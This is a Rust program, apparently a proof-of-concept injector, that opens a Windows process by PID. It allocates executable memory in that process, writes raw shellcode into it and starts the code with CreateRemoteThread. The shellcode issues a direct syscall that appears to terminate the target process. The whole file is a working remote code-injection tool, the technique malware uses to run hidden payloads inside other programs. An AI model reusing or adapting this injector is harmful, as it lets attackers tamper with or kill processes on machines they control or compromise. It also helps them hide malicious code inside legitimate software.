use argh::FromArgs;
use color_eyre::{ Report, Result };

use windows::{
        Win32::
        {
            System::
            {
                Diagnostics::Debug::WriteProcessMemory, 
                Memory::{
                    MEM_COMMIT, 
                    PAGE_EXECUTE_READWRITE, 
                    VirtualAllocEx
                }, 
                Threading::{
                    OpenProcess, 
                    PROCESS_QUERY_INFORMATION, 
                    PROCESS_CREATE_THREAD, 
                    PROCESS_VM_OPERATION, 
                    PROCESS_VM_READ, 
                    PROCESS_VM_WRITE, 
                    CreateRemoteThread
            }}, 
        Security::SECURITY_ATTRIBUTES}};

// Init parse args
/// This Doc Comment is NON-OPTIONAL!
#[derive(FromArgs, Debug)]
struct Args {
    /// the Process ID to inject into
    #[argh(positional)]
    pid: u32,
}

fn main() -> Result<(), Report> {
    color_eyre::install()?; // idk
    let args: Args = argh::from_env(); // actually read args
    unsafe { do_crimes(args)?; } // all the code (unsafe, unsurprisingly)
    Ok(())
}

unsafe fn do_crimes(args: Args) -> Result<(), Report> {
    let pid = args.pid;

    let access = 
        PROCESS_CREATE_THREAD 
        | PROCESS_QUERY_INFORMATION 
        | PROCESS_VM_OPERATION 
        | PROCESS_VM_READ 
        | PROCESS_VM_WRITE;

    let process = OpenProcess(
        access, 
        false, 
        pid
    )?;
    println!("Opened Process {process:?}");

    let target_addr = VirtualAllocEx(
        process,
        Some(std::ptr::null_mut()), 
        1024, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE
    );
    assert!(!target_addr.is_null());

    let src: Vec<u8> = vec![
        0xB8, 0x2C, 0x00, 0x00, 0x00, // mov eax,2Ch
        0x49, 0xC7, 0xC2, 0xFF, 0xFF, 0xFF, 0xFF, // mov r10,0FFFFFFFFFFFFFFFFh
        0x48, 0xC7, 0xC2, 0x4D, 0x00, 0x00, 0x00, // mov rdx,4Dh 
        0x0F, 0x05, // syscall
        0xF4, // hlt
    ];
    let mut written = 0;
    WriteProcessMemory(
        process, 
        target_addr, 
        src.as_ptr() as _, 
        src.len(), 
        Some(&mut written)
    ).ok()?;
    assert_eq!(written, src.len() as _);

    let mut tid: u32 = 0;

    let thread_attributes : *const SECURITY_ATTRIBUTES = &SECURITY_ATTRIBUTES{
        nLength: 0u32,
        lpSecurityDescriptor: std::ptr::null_mut(),
        bInheritHandle: windows::Win32::Foundation::BOOL(0)
    };

    let thread = CreateRemoteThread(
        process, 
        Some(thread_attributes), 
        0, 
        Some(std::mem::transmute(target_addr)), 
        Some(std::ptr::null_mut()), 
        0, 
        Some(&mut tid)
    )?;

    println!("Created thread {thread:?}, tid = {tid:?}");
    Ok(())
}
